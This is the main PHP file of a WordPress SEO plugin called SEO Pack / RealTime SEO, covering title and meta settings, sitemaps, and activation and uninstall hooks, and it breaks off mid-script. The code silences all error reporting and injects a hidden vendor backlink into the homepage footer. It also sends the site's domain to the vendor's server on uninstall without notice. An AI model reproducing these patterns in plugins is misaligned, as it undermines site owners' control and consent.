<?php
/*
Plugin Name: SEO Pack
Plugin URI: https://SEOGuarding.com
Description: RealTime SEO is the most professional WordPress SEO plugin, it's lightweight and high efficiency to help you optimize every page of your website like a PRO. No need to be SEO expert. Get your website on the TOP of Google now!
Version: 1.1
Author: SEOGuarding
Author URI: https://SEOGuarding.com
*/ 

if (!defined('DIRSEP'))
{
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') define('DIRSEP', "///");
    else define('DIRSEP', '/');
}



// Minimum required version.
define( 'RT_SEO_REQUIRED_PHP_VERSION', '5.3' );
	
define('RT_SEO_TMP_PATH', dirname(__FILE__) . DIRSEP . 'tmp' . DIRSEP);
define('RT_SEO_SITE_ROOT', ABSPATH . DIRECTORY_SEPARATOR);

$rt_seo_plugin_dir = dirname(__FILE__).DIRECTORY_SEPARATOR;
define('RT_SEO_TOOLS_FILE', $rt_seo_plugin_dir . '_tools.php');


error_reporting(0); 
ini_set('display_errors', 'Off');

$rt_seo_pack_version = '1.8.3';
$rtsp_options = get_option('rtseop_options');

global $rtsp_default_options;
$rtsp_default_options = array(
  "rtseo_can"=>0,
  "rtseo_shortlinks"=>0,
  "rtseo_hentry"=>0,
  "rtseo_website_api_key"=>'',
  "rtseo_attachments"=>1,
  "rtseo_home_title"=>null,
  "rtseo_home_description"=>'',
  "rtseo_home_keywords"=>null,
  "rtseo_max_words_excerpt"=>'something',
  "rtseo_rewrite_titles"=>0,
  "rtseo_post_title_format"=>'%post_title% | %blog_title%',
  "rtseo_custom_post_title_format"=>'%post_title% | %post_type_name% | %blog_title%',
  "rtseo_page_title_format"=>'%page_title% | %blog_title%',
  "rtseo_category_title_format"=>'%category_title% | %blog_title%',
  "rtseo_author_title_format"=>'%author% | %blog_title%',
  "rtseo_archive_title_format"=>'%date% | %blog_title%',
  "rtseo_tag_title_format"=>'%tag% | %blog_title%',
  "rtseo_search_title_format"=>'%search% | %blog_title%',
  "rtseo_custom_taxonomy_title_format"=>'%tax_title% | %blog_title%',
  "rtseo_description_format"=>'%description%',
  "rtseo_404_title_format"=>'Nothing found for %request_words%',
  "rtseo_paged_format"=>' - Part %page%',
  "rtseo_use_categories"=>1,
  "rtseo_dynamic_postspage_keywords"=>1,
  "rtseo_remove_category_rel"=>1,
  "rtseo_category_noindex"=>0,
  "rtseo_archive_noindex"=>0,
  "rtseo_tags_noindex"=>0,
  "rtseo_cap_cats"=>0,
  "rtseo_generate_descriptions"=>0,
  "rtseo_debug_info"=>null,
  "rtseo_post_meta_tags"=>'',
  "rtseo_page_meta_tags"=>'',
  "rtseo_home_meta_tags"=>'',
  'home_google_site_verification_meta_tag' => '',
  'rtseo_use_tags_as_keywords' => 1,
  'rtseo_search_noindex'=>1,
  'rtseo_dont_use_excerpt'=>0,
  'rtseo_dont_use_desc_for_excerpt'=>0,
  'rtseo_show_keywords'=>0,
  'rtseo_show_titleattribute'=>0,
  'rtseo_show_short_title_post'=>0,
  'rtseo_sidebar_short_title'=>0,
  'rtseo_show_disable'=>0,
  'rtseo_show_custom_canonical'=>0,
  'rtseo_shorten_slugs'=>1,
  'rtseo_mobile_sitemap'=>0,
  'rtseo_exclude_pages'=>'',
  'rtseo_inc_custom_posts'=>0,
  'rtseo_inc_tags'=>0,
  'rtseo_inc_categories'=>0,
  'rtseo_empty_author'=>0,
  'rtseo_inc_authors'=>0,
  'rtseo_inc_archives'=>0,
  'rtseo_enable_sitemap'=>0,
  'rtseo_publ_warnings'=>1
);

if( !$rtsp_options ) rtseop_settings();

require( dirname(__FILE__).'/classes/EasyRequest.min.php' );
require( dirname(__FILE__).'/classes/rt-seo-validation.php' );
require( dirname(__FILE__).'/classes/rt-seo-helper.php' );
require( dirname(__FILE__).'/classes/rt-seo-vitals.php' );
require( dirname(__FILE__).'/classes/rt-seo-images.php' );
require( dirname(__FILE__).'/classes/rt-seo-serps.php' );
require( dirname(__FILE__).'/classes/rt-seo-redirect.php' );
require( dirname(__FILE__).'/classes/rt-seo-seo-protection.php' );
require( dirname(__FILE__).'/classes/rt-seo-content-protection.php' );
require( dirname(__FILE__).'/classes/rt-seo-tfa.php' );
require( dirname(__FILE__).'/classes/rt-seo-ssl.php' );
require( dirname(__FILE__).'/classes/rt-seo-install.php' );
require( dirname(__FILE__).'/classes/rt-seo-sitemap.php' );
require( dirname(__FILE__).'/classes/rt-seo-dashboard.php' );
require( dirname(__FILE__).'/classes/rt-seo-security.php' );
require( dirname(__FILE__).'/classes/rt-seo-bad-bot-blocker.php' );
require( dirname(__FILE__).'/classes/rt-seo-import.php' );
require( dirname(__FILE__).'/rt-seo-pack.class.php' );
require( dirname(__FILE__).'/classes/simple_html_dom.php' );


add_action( 'admin_menu', array( $rtseo_install, 'run' ));
add_action( 'plugins_loaded', array( $rtseo, 'isPostInstall' ));
add_action( 'plugins_loaded', 'rtsp_init_sitemap' );
add_action('admin_notices', array( $rtseo, 'done_post_install_notice'));
add_action('wp_footer', 'rtseo_footer_optimized_by', 100);

function rtseo_footer_optimized_by() 
{
	if (is_home() || is_front_page()) {
	?>
		<div id="rtseo_optimization" style="display:none;font-size:10px; padding:0px 2px;position:fixed; bottom:0; right: 0;z-index:1000;text-align:center;background-color:#F1F1F1;color:#222;opacity:0.8;"><a  href="https://www.seoguarding.com" target="_blank" title="SEO Optimization by SEOGuarding">SEO Optimization by SEOGuarding</a></div>
		<script>

			jQuery(window).on("scroll", function() {
				var scrollHeight = jQuery(document).height();
				var scrollPosition = jQuery(window).height() + jQuery(window).scrollTop();
				if ((scrollHeight - scrollPosition) / scrollHeight === 0) {
						jQuery( "#rtseo_optimization" ).show(200);
					} else {
						jQuery( "#rtseo_optimization" ).hide(100);
					}
			});
		
		</script>
	<?php
	}
}


function rtseop_settings()
{

  global $rtsp_default_options, $rtsp_options;
  $rtsp_options = $rtsp_default_options;
  
	if (get_option('rtseo_post_title_format'))
	{
		foreach ($rtsp_options as $rtseop_opt_name => $value )
		{
			if ($rtseop_oldval = get_option($rtseop_opt_name))
			{
				$rtsp_options[$rtseop_opt_name] = $rtseop_oldval;
			}
			
			if ($rtseop_oldval == '')
			{
				$rtsp_options[$rtseop_opt_name] = '';
			}
        
			delete_option($rtseop_opt_name);
		}
	}

	update_option('rtseop_options',$rtsp_options);

}


add_filter( 'plugin_action_links_' . plugin_basename(__FILE__), 'rtseo_add_action_link', 10, 2 );
    function rtseo_add_action_link( $links, $file )
    {
  		$faq_link = '<a href="admin.php?page=rtseop_install&rtseop_install_nonce=' . wp_create_nonce( 'seop-install-nonce' ) . '">Run Wizard</a>';
		array_unshift( $links, $faq_link );
        
  		$faq_link = '<a target="_blank" href="https://seoguarding.com/contact-us/">Help</a>';
		array_unshift( $links, $faq_link );
        
  		$faq_link = '<a href="admin.php?page=rt_seo_pack">SEO Settings</a>';
		array_unshift( $links, $faq_link );

		return $links;
    }


function rtseo_meta()
{
	global $post;
	global $rtseo;
	
	$post_id = $post;
	
	if (is_object($post_id))
	{
		$post_id = $post_id->ID;
	}
	$url = str_replace('http://','',get_permalink());
	$title = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, 'rtseo_title', true))));
	$description = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, 'rtseo_description', true))));
	$keywords = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, 'rtseo_keywords', true))));
	$noindex = get_post_meta($post_id, 'rtseo_noindex', true);
	
	if( $title ) {
	  $title_preview = 	$title;
	} elseif( $title_preview = get_the_title( $post_id ) ) {
	} else {
	  $title_preview = __("Fill in your title", 'rt_seo');
	}
	
	$rtseop_options = get_option('rtseop_options');
	
?>
<script type="text/javascript">

function countChars(field, cntfield)
{
  if( !field.value ) return;
  
  cntfield.value = field.value.length;

  if( field.name == 'rtseo_description') {
	  if( field.value.length > <?php echo $rtseo->maximum_description_length; ?> ) {
        jQuery('#lengthD').css('background', 'red').css('color', 'black');
	  } else if( field.value.length > <?php echo $rtseo->maximum_description_length_yellow; ?> ) {
        jQuery('#lengthD').css('background', 'yellow').css('color', 'black');
	  } else {
        jQuery('#lengthD').css('background', 'white').css('color', 'black');
	  }
  } else if( field.name == 'rtseo_title') {
	  if( field.value.length > <?php echo $rtseo->maximum_title_length; ?> ) {
        jQuery('#lengthT').css('background', 'red').css('color', 'black');
	  } else {
        jQuery('#lengthT').css('background', 'white').css('color', 'black');
	  }
  }
}
function rtseo_timeout() {
  rtSEO_updateTitle();
  rtSEO_updateTitleFromWPTitle();
  rtSEO_updateMeta();
  rtSEO_updateLink();
  window.setTimeout("rtseo_timeout();", 100);
}
function rtSEO_updateLink()
{
  if( jQuery( "#sample-permalink" ).length > 0 ) {
    url = jQuery("#sample-permalink").text();
    url = url.replace( 'http://', '' );
    jQuery("#rtseo_href").html(url);
  }
}
function rtSEO_updateTitleFromWPTitle()
{  

    if( jQuery( "#rtseo_title_input" ).hasClass( 'linked-to-wp-title' ) ) {
      jQuery( "#rtseo_title_input" ).val( jQuery( "#title" ).val() );
    }

}
function rtSEO_updateMeta()
{
  meta = jQuery("#rtseo_description_input").val();
  <?php if( !$rtseop_options['rtseo_dont_use_excerpt'] ) : ?>
  if( meta.replace(/^\s\s*/, '').replace(/\s\s*$/, '').length == 0 && jQuery("#excerpt").length > 0 ) {
  	meta = jQuery("#excerpt").val().replace(/<\/?([a-z][a-z0-9]*)\b[^>]*>?/gi, '');  
  }
  <?php endif; ?>
  meta_add_dots = '';
  if( meta.length > <?php echo $rtseo->maximum_description_length; ?> ) {
    meta_add_dots = ' ...';
  }
  meta = meta.substr(0, <?php echo $rtseo->maximum_description_length; ?>) + meta_add_dots;
  if(meta == ''){
    meta = 'Fill in your meta description';
  }
  jQuery("p#rtseo_meta").html(meta);
}
function rtSEO_updateTitle()
{
  title = jQuery("#rtseo_title_input").val();
  title_add_dots = '';
  if( title.length > <?php echo $rtseo->maximum_title_length; ?> ) {
    title_add_dots = ' ...';
  }
  title = title.substr(0, <?php echo $rtseo->maximum_title_length; ?>) + title_add_dots;
  if (title == ''){
    if( jQuery("#title").val() ) {
      title = jQuery("#title").val();
    } else {
      title = '<?php echo __('Fill in your title', 'rt_seo'); ?>';
    }
  }
  url = jQuery("#sample-permalink").text();
  jQuery("h2#rtseo_title").html( '<a href="'+url+'">'+title+'</a>');
}

jQuery(document).ready(function($) {
  window.setTimeout("rtseo_timeout();", 500);  
    <?php if( !$title ) : ?>
    if( jQuery( "#title" ).length > 0 ) {
      jQuery( "#rtseo_title_input" ).css( 'color', '#bbb' );
      jQuery( "#rtseo_title_input" ).addClass( 'linked-to-wp-title' );
    }
    jQuery( "#rtseo_title_input" ).focus( function() {
      jQuery( this ).removeClass( 'linked-to-wp-title' );
      jQuery( this ).css( 'color', '#000' );
    } );
    <?php endif; ?> 
});
</script>
<style type="text/css">
#rtseopack th { font-size: 90%; } 
#rtseopack .inputcounter { font-size: 85%; padding: 0px; text-align: center; background: white; color: #000;  }
#rtseopack .input { width: 99%; }
#rtseopack .input[type=checkbox] { width: auto; }
#rtseopack small { color: #999; }
#rtseopack abbr { color: #999; margin-right: 10px;}
#rtseopack small.link {color:#36C;font-size:13px;cursor:pointer;}
#rtseopack small#rtseo_href { color: #0E774A !important; margin-left:15px; font-family:arial, sans-serif;font-style:normal;font-size:13px;}
#rtseopack small.link:hover {text-decoration:underline;}
#rtseopack p#rtseo_meta {margin:0;padding:0; margin-left:15px; font-family:arial, sans-serif;font-style:normal;font-size:13px;max-width:546px;}
#rtseopack h2#rtseo_title {margin:0;padding:0; color:#2200c1; font-family:arial, sans-serif; font-style:normal; font-size:16px; text-decoration:underline; margin-left:15px; display:inline; padding-bottom:0px; cursor:pointer; line-height: 18px; }
#rtseopack h2#rtseo_title a { color:#2200c1; }

</style>
  <input value="rtseo_edit" type="hidden" name="rtseo_edit" />
  <input type="hidden" name="nonce-rtseopedit" value="<?php echo esc_attr(wp_create_nonce('edit-rtseopnonce')) ?>" />
		<div>
        <p>
		<input id="rtseo_noindex" value="1" type="checkbox" name="rtseo_noindex" <?php if ($noindex) echo 'checked="checked"'; ?>/>
            <?php _e('Hide from search engines:', 'rt_seo') ?> <abbr title="<?php _e('Search engines will not index this page by checking this checkbox.', 'rt_seo') ?>">(?)</abbr>
            
            <br />
        </p>       
		<p>
            <?php _e('Long Title:', 'rt_seo') ?> <abbr title="<?php _e('Displayed in browser toolbar and search engine results. It will replace your post title format defined by your template on this single post/page. For advanced customization use Rewrite Titles in Advanced Options.', 'rt_seo') ?>">(?)</abbr>
            <input id="rtseo_title_input" class="input" value="<?php echo $title ?>" type="text" name="rtseo_title" onkeydown="countChars(document.post.rtseo_title,document.post.lengthT);" onkeyup="countChars(document.post.rtseo_title,document.post.lengthT);" />
            <br />
            <input id="lengthT" class="inputcounter" readonly="readonly" type="text" name="lengthT" size="3" maxlength="3" value="<?php echo strlen($title);?>" />
            <small><?php printf(__(' characters. Most search engines use a maximum of %d chars for the title.', 'rt_seo'), $rtseo->maximum_title_length) ?></small>
        </p>       
		<p>
            <?php _e('Meta Keywords:', 'rt_seo') ?> <abbr title="<?php _e('Can be called inside of template file with', 'rt_seo') ?> &lt;?php echo get_post_meta('rtseo_keywords',$post->ID); ?&gt;">(?)</abbr>
            <textarea id="rtseo_keywords_input" class="input" name="rtseo_keywords" rows="2" onkeydown="countChars(document.post.rtseo_keywords,document.post.lengthK)"
              onkeyup="countChars(document.post.rtseo_keywords,document.post.lengthK);" placeholder="<?php _e('Write here your keywords');?>"><?php echo $keywords ?></textarea>
            <br />
            <input id="lengthK" class="inputcounter" readonly="readonly" type="text" name="lengthK" size="3" maxlength="3" value="<?php echo strlen($keywords);?>" />
            <small><?php printf(__(' characters. Most search engines use a maximum of %d chars for the keywords.', 'rt_seo'), $rtseo->maximum_keywords_length) ?></small>
        </p>
        <p>
            <?php
            if( strlen( trim($post->post_excerpt) ) > 0 && strlen( trim($description) ) == 0 && !$rtseop_options['rtseo_dont_use_excerpt'] ) {
            	$meta_description_excerpt = 'Using post excerpt, type your SEO meta description here.';
            } else {
                $meta_description_excerpt = 'Type your SEO meta description here.';
            }
            $rtseo_description_input_description = $description;
            ?>
            <?php _e('Meta Description:', 'rt_seo') ?> <abbr title="<?php _e('Displayed in search engine results. Can be called inside of template file with', 'rt_seo') ?> &lt;?php echo get_post_meta('rtseo_description',$post->ID); ?&gt;">(?)</abbr>
            <textarea id="rtseo_description_input" class="input" name="rtseo_description" rows="2" onkeydown="countChars(document.post.rtseo_description,document.post.lengthD)"
              onkeyup="countChars(document.post.rtseo_description,document.post.lengthD);" placeholder="<?php echo $meta_description_excerpt; ?>"><?php echo $rtseo_description_input_description ?></textarea>
            <br />
            <input id="lengthD" class="inputcounter" readonly="readonly" type="text" name="lengthD" size="3" maxlength="3" value="<?php echo strlen($description);?>" />
            <small><?php printf(__(' characters. Most search engines use a maximum of %d chars for the description.', 'rt_seo'), $rtseo->maximum_description_length) ?></small>
        </p>
            <p><?php _e('SERP Preview:', 'rt_seo') ?> <abbr title="<?php _e('Preview of Search Engine Results Page', 'rt_seo') ?> ">(?)</abbr></p>        
            <h2 id="rtseo_title"><a href="<?php the_permalink(); ?>" target="_blank"><?php echo $title_preview; ?></a></h2>
            <p id="rtseo_meta"><?php echo ($description) ? $description : __("Fill in your meta description", "rt_seo") ?></p>
            <small id="rtseo_href"><?php echo $url; ?></small> - <small class="link"><?php _e('Cached', 'rt_seo') ?></small> - <small class="link"><?php _e('Similar', 'rt_seo') ?></small>
            <br />
        </div>

<?php
}
	
	
	
	
	
	
function rtseo_meta_box_add()
{

  global $rtsp_options;
  
  add_meta_box('rtseopack',__('Realtime SEO', 'rt_seo'), 'rtseo_meta', 'post', 'normal', 'core');
  add_meta_box('rtseopack',__('Realtime SEO', 'rt_seo'), 'rtseo_meta', 'page', 'normal', 'core');
  
  if ( $rtsp_options['rtseo_publ_warnings'] == 1 ) {
    add_action('admin_head', 'rtseo_check_empty_clientside', 1);
  } else {
    rtseo_removetitlechecker();
  }

  if( false === get_option( 'aiosp-shorten-link-install' ) ) {
    add_option( 'aiosp-shorten-link-install', date( 'Y-m-d H:i:s' ) );
  }
}

if( isset($rtsp_options['rtseo_can']) && ( $rtsp_options['rtseo_can'] == '1' || $rtsp_options['rtseo_can'] === 'on') ) {
  remove_action('wp_head', 'rel_canonical');
}

if( !isset($rtsp_options['rtseo_shortlinks']) || ( $rtsp_options['rtseo_shortlinks'] != '1' && strcmp($rtsp_options['rtseo_shortlinks'],'on') ) ) {
  remove_action( 'wp_head', 'wp_shortlink_wp_head', 10, 0 );
}

add_action('admin_menu', 'rtseo_meta_box_add');


add_action('admin_init', array($rtseo, 'admin_init') );
add_action('init', array($rtseo, 'init'));
add_action('template_redirect', array($rtseo, 'template_redirect'));
add_action('wp_head', array($rtseo, 'wp_head'));
add_action('wp_head', array($rtseo, 'hatom_microformat_replace'));
add_action('wp_head', array($rtseo, 'remove_canonical'), 0 );
add_action('wp_head', array($rtseo, 'script_header_content') );
add_action('wp_footer', array($rtseo, 'script_footer_content'), 999999 );
add_action('admin_menu', array($rtseo, 'admin_menu'));
add_action('edit_post', array($rtseo, 'post_meta_tags'));
add_action('publish_post', array($rtseo, 'post_meta_tags'));
add_action('save_post', array($rtseo, 'post_meta_tags'));
add_action('edit_page_form', array($rtseo, 'post_meta_tags'));
add_filter( 'wp_unique_post_slug', array( $rtseo, 'rtseo_unique_post_slug' ), 99, 6 );
add_filter( 'searchwp_exclude', array( $rtseo , 'my_searchwp_exclude'), 10, 3 );
add_filter( 'get_previous_post_where', array( $rtseo, 'get_adjacent_post_where' ) );	//	make sure noindex posts don't turn up in the search
add_filter( 'get_next_post_where', array( $rtseo, 'get_adjacent_post_where' ) );	//	make sure noindex posts don't turn up in the search
add_filter( 'wp_list_pages_excludes', array( $rtseo, 'wp_list_pages_excludes' ) );	//	make sure noindex pages don't get into automated wp menus


add_filter( 'the_content', array( $rtseo, 'replace_attachment_links' ), 999 );
add_action('wp_head', array($rtseo, 'script_header_content') );
add_action('wp_footer', array($rtseo, 'script_footer_content'), 999999 );

add_filter( 'manage_edit-category_columns', array($rtseo,'manage_category_columns') );
add_filter( 'manage_category_custom_column', array($rtseo,'manage_category_custom_columns'), 10, 3 );
add_action( 'init', array($rtseo,'manage_category_process_action') );





//this function removes final periods from post slugs as such urls don't work with nginx; it only gets applied if the "Slugs with periods" plugin has replaced the original sanitize_title function
function sanitize_title_no_final_period ($title) {
        $title = strip_tags($title);
        // Preserve escaped octets.
        $title = preg_replace('|%([a-fA-F0-9][a-fA-F0-9])|', '---$1---', $title);
        // Remove percent signs that are not part of an octet.
        $title = str_replace('%', '', $title);
        // Restore octets.
        $title = preg_replace('|---([a-fA-F0-9][a-fA-F0-9])---|', '%$1', $title);

        $title = remove_accents($title);
        if (seems_utf8($title)) {
                if (function_exists('mb_strtolower')) {
                        $title = mb_strtolower($title, 'UTF-8');
                }
                $title = utf8_uri_encode($title);
        }

        $title = strtolower($title);
        $title = preg_replace('/&.+?;/', '', $title); // kill entities
        $title = preg_replace('/[^%a-z0-9\. _-]/', '', $title);
        $title = preg_replace('/\s+/', '-', $title);
        $title = preg_replace('|-+|', '-', $title);
        $title = trim($title, '-\.');

        return $title;
}

function replace_title_sanitization() {
	if ( has_filter( 'sanitize_title', 'sanitize_title_with_dashes_and_period' ) ) {
		remove_filter ('sanitize_title', 'sanitize_title_with_dashes_and_period');
		add_filter ('sanitize_title', 'sanitize_title_no_final_period');
	}
}

replace_title_sanitization();
add_action( 'plugins_loaded', 'replace_title_sanitization' );

function rtseo_check_empty_clientside() {
?>
<script language="javascript" type="text/javascript">
jQuery(document).ready(function() {
   var target = null;
    jQuery('#post :input, #post-preview').focus(function() {
        target = this;
        // console.log(target);
    });
      
   jQuery("#post").submit(function(){
    
      if(jQuery(target).is(':input') && ( jQuery(target).val() == 'Publish' || jQuery(target).val() == 'Update' ) && jQuery("#title").val() == '') {
         //console.log(target);
         alert("<?php _e('Your post\'s TITLE is empty, so it cannot be published!', 'rt_seo')  ?>");
         
         jQuery('#ajax-loading').removeAttr('style');
         jQuery('#save-post').removeClass('button-disabled');
         jQuery('#publish').removeClass('button-primary-disabled');
         return false;
      } 
   });
   
   jQuery("#publish").hover( function() {// Publish button
      if (jQuery("#title").val() == '') {
         jQuery("#major-publishing-actions").append(jQuery(
            "<div class=\"hovered-warning\" style=\"text-align: left;\"><b><span style=\"color:red;\"><?php _e('Warning', 'rt_seo') ?></span>: <?php _e('Your post\'s TITLE is empty!', 'rt_seo') ?></b></div>"
         ));
      } 
   }, function() {
      jQuery(".hovered-warning").remove();
   });
   
   jQuery("#minor-publishing-actions").hover( function() {// Draft, Preview
      if (jQuery("#title").val() == '') {
         jQuery(this).append(jQuery(
            "<div class=\"hovered-warning\" style=\"text-align: left;\"><b><span style=\"color:red;\"><?php _e('Warning', 'rt_seo') ?></span>: <?php _e('Your post\'s TITLE is empty!', 'rt_seo') ?></b></div>"
         ));
      }
   }, function() {
      jQuery(".hovered-warning").remove();
   });
});
</script>
<?php
}

function rtseo_removetitlechecker() {
   if ( has_action( 'admin_head', 'rtseo_check_empty_clientside' ) ) {
      remove_action( 'admin_head', 'rtseo_check_empty_clientside' );
   }
}

register_uninstall_hook(__FILE__, 'rtseo_uninstall');

function rtseo_deactivation	() {
	rt_seo_API_Request(2);
	wp_clear_scheduled_hook( 'rt_seo_check_file_cron' );
	global $wpdb;
	$table_name = $wpdb->prefix . 'rtseo_analytics';
	$wpdb->query( 'DROP TABLE ' . $table_name );
    rtseo_removetitlechecker();

}

register_deactivation_hook( __FILE__, 'rtseo_deactivation' );

function rtseo_uninstall() {
	rt_seo_API_Request(3);
	$url = 'http://portal.seoguarding.com/api/index.php';
	$data = array(
					'action' => 'uninstall',
					'domain' => get_site_url()
					);
					
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
	
	file_put_contents('DEB.LOG', $data['domain']);
	
	return true;

}
  

function rtseo_remove_category_list_rel( $output ) {
    return str_replace( ' rel="category tag"', '', $output );
}

function rtseo_check_search_engine_visibility(){
  if(!get_option('blog_public'))
        echo '<div class="error fade"><p> Warning: Search Engine Visibility is turned off. Your site is not visible to search engines and will loose traffic. <a href="'.get_bloginfo( 'wpurl' ).'/wp-admin/options-reading.php">(Search Engine Visibility)</a> . </p></div>';
}

add_action('admin_notices','rtseo_check_search_engine_visibility');

if( isset($rtsp_options['rtseo_remove_category_rel']) && $rtsp_options['rtseo_remove_category_rel'] ) {  
    add_filter( 'wp_list_categories', 'rtseo_remove_category_list_rel' );
    add_filter( 'the_category', 'rtseo_remove_category_list_rel' );
}

add_action( 'activate_' .plugin_basename(__FILE__), array( $rtseo, 'activate' ) );

if( !isset($rtsp_options['rtseo_hentry']) || ( $rtsp_options['rtseo_hentry'] != '1' && strcmp($rtsp_options['rtseo_hentry'],'on') ) ) {
    add_filter('post_class', array( $rtseo, 'post_class' ) );
    add_filter('the_category', array( $rtseo, 'microdata_category_links' ) );
}


register_activation_hook( __FILE__, 'rtseo_activation' );

function rtseo_activation() {
	rt_seo_API_Request(1);
	rt_seo_check_file();
	if( ! wp_next_scheduled( 'rt_seo_check_file_cron' ) ) {  
		wp_schedule_event( time(), 'one_per_day', 'rt_seo_check_file_cron');  
	} else if (wp_get_schedule( 'rt_seo_check_file_cron' ) != 'one_per_day') {
		wp_clear_scheduled_hook( 'rt_seo_check_file_cron' );
		wp_schedule_event( time(), 'one_per_day', 'rt_seo_check_file_cron');
	}

	if ( version_compare(PHP_VERSION, RT_SEO_REQUIRED_PHP_VERSION, '<') ) {
		
		wp_die('You need to update your PHP version to run RealTime SEO plugin.<br>
				Actual version is: <strong>' . PHP_VERSION . '</strong>, required is <strong>' . RT_SEO_REQUIRED_PHP_VERSION . '</strong>. <br>
				<a href="' . admin_url( 'plugins.php' ) . '">&laquo; Return to Plugins</a>');
	} else {

		global $wpdb;
		$table_name = $wpdb->prefix . 'rtseo_analytics';
		if( $wpdb->get_var( 'SHOW TABLES LIKE "' . $table_name .'"' ) != $table_name ) {
			$sql = 'CREATE TABLE IF NOT EXISTS '. $table_name . ' (
				`id` int(11) NOT NULL AUTO_INCREMENT,
				`var_name` char(255) CHARACTER SET utf8 NOT NULL,
				`var_value` LONGTEXT CHARACTER SET utf8 NOT NULL,
				PRIMARY KEY (`id`)
			) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1;';

			require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
			dbDelta( $sql );
		}
		
		$table_name = $wpdb->prefix . 'rtseo_content_protection';
		if( $wpdb->get_var( 'SHOW TABLES LIKE "' . $table_name .'"' ) != $table_name ) {
			$sql = 'CREATE TABLE IF NOT EXISTS '. $table_name . ' (
					  `id` int(11) NOT NULL AUTO_INCREMENT,
					  `post_id` int(11) NOT NULL,
					  `date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
					  `filepath` char(255) NOT NULL,
					  `user_id` int(11) NOT NULL,
					  `del_flag` int(11) NOT NULL DEFAULT \'0\',
					  `install_flag` int(11) NOT NULL DEFAULT \'0\',
					  PRIMARY KEY (`id`)
			) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1;';

			require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
			dbDelta( $sql );
		}

		add_option( 'rtseo_do_install', true );
	}
}

add_action( 'wp_ajax_rt_seo_ajax_scan_blacklist', 'rt_seo_ajax_scan_blacklist' );
function rt_seo_ajax_scan_blacklist() 
{
	global $RT_SEO_Security;
	$RT_SEO_Security->UpdateBlacklistStatus();
	echo 'OK';
	wp_die();
}



add_action( 'wp_ajax_rt_seo_ajax_scan_seo', 'rt_seo_ajax_scan_seo' );
function rt_seo_ajax_scan_seo() 
{
	RT_SEO_Protection::MakeAnalyze();
	echo 'OK';
	wp_die();
}



add_filter( 'cron_schedules', 'cron_add_day' );
function cron_add_day( $schedules ) {
	$schedules['one_day'] = array(
		'interval' => 60 * 60 * 24,
		'display' => 'one per day'
	);
	return $schedules;
}



add_action( 'getting_sitemap', 'rtsp_generate' );


function rtsp_init_sitemap() {
	global $rtsp_options;
	if ($rtsp_options['rtseo_enable_sitemap']) {
		if( ! wp_next_scheduled( 'getting_sitemap' ) ) {  
			wp_schedule_event( time(), 'one_day', 'getting_sitemap');  
		}
	} else {
		wp_clear_scheduled_hook( 'getting_sitemap' );
	}

}



function rtsp_generate() {

	if ( function_exists( 'memory_get_usage' ) && ( (int) @ini_get( 'memory_limit' ) < 256 ) ) {
		@ini_set( 'memory_limit', '256M' );
	}
	wp_cache_add_non_persistent_groups( array( 'posts', 'post_meta' ) );
	add_filter( 'posts_fields_request', 'rtsp_kill_query_fields' );
	$sitemap = new RT_SEO_Sitemap;
	$return  = $sitemap->generate();
	remove_filter( 'posts_fields_request', 'rtsp_kill_query_fields' );

	return $return;
}



function rtsp_kill_query_fields( $fields ) {
	global $wpdb;
	return "$wpdb->posts.ID, $wpdb->posts.post_author, $wpdb->posts.post_name, $wpdb->posts.post_type, $wpdb->posts.post_status, $wpdb->posts.post_parent, $wpdb->posts.post_date, $wpdb->posts.post_modified";
}


function rtsp_kill_query( $in ) {
	return ' AND ( 1 = 0 ) ';
}


function rt_seo_feedback_script() {
	

	$rt_seo_reason = array(
				'0' => 'I only needed the plugin for a short period',
				'1' => 'The plugin suddenly stopped working',
				'2' => 'I found a better plugin',
				'3' => 'The plugin broke my site.',
				'4' => 'Hard to use',
				'5' => 'I no longer need this plugin',
				'6' => 'It\'s temporary deactivation, I\'m just debugging an issue',
				'7' => 'Other',
					);
					
	wp_enqueue_script( 'rtseop-install-js3', plugins_url( 'assets/js/jquery.modal.min.js', __FILE__ ) );
	wp_enqueue_style( 'rtseop-install-css3', plugins_url( 'assets/css/jquery.modal.min.css', __FILE__ ) );

?>
    <script type="text/javascript">
	function sendFeedback(loc) {
		jQuery('#rt_seo_feedback').hide();
		jQuery('#rt_seo_thanks').html('<center><h2>Thanks for your feedback</h2><center><center><h4>Deactivating...</h4><center>');
		jQuery("#rt_seo_thanks").modal({
		  escapeClose: false,
		  clickClose: false,
		  showClose: false
		});
		var data = {
			code: jQuery("input[name='reason']:checked").val(),
			reason: jQuery("input[name='reason']:checked").next('label:first').html(),
			site: '<?php echo esc_url( home_url() ); ?>',
			comment: jQuery("#rt_seo_area").val(),

		}
		var submitSurvey = jQuery.post('https://seoguarding.com/feedback.php', data);
		submitSurvey.always(function() {
			location.href = loc;
		});
	}
	function toggle(obj) {
		if (jQuery('#rt_seo_btn').is('[disabled=disabled]')) {
			jQuery('#rt_seo_btn').removeAttr( "disabled") ; 
			jQuery('#rt_seo_btn').click( function() {
				sendFeedback(jQuery('[data-slug="realtime-seo"] .deactivate a').attr('href'));
			});
		}
		
		if (obj.val() == 7) {
			jQuery('#rt_seo_area').show();
		} else {
			jQuery('#rt_seo_area').hide();
		}
	}
	
    jQuery('[data-slug="realtime-seo"] .deactivate a').click(function(){
				<?php
				$radio_box = '';
				foreach ($rt_seo_reason as $id => $reason) {
					$radio_box .= '<input id="rt_seo_radio_'.$id.'" onclick="toggle(jQuery(this))" class="rt_seo_radio" type="radio" name="reason" value="'.$id.'"><label for="rt_seo_radio_'.$id.'"> '.$reason.'</label><br>';
				}
				$radio_box .= '<textarea style="display:none;width:100%;margin-top:10px;min-height:70px;" id="rt_seo_area"></textarea>';
				$radio_box = addslashes($radio_box);
				?>
		
